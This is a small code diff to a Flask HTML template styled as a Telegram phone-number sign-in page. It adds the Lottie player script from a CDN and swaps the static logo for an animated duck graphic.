@@ -295,12 +295,13 @@
         }
 
     </style>
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
 </head>
 
 <body>
     <div class="container">
         <div class="reg">
-            <img src="{{ url_for('static', filename='telegram-logo.svg') }}" alt="logo" width="120" height="120">
+            <lottie-player src="{{ url_for('static', filename='duck.json') }}" background="transparent" speed="1" style="width: 150px; height: 150px;" loop autoplay></lottie-player>
             <div class="header">
                 <h1 style="font-size: 1.5rem !important">Telegram<h1>
                 <p class="subtitle">Please confirm your country code<br>and enter your phone number.</p>
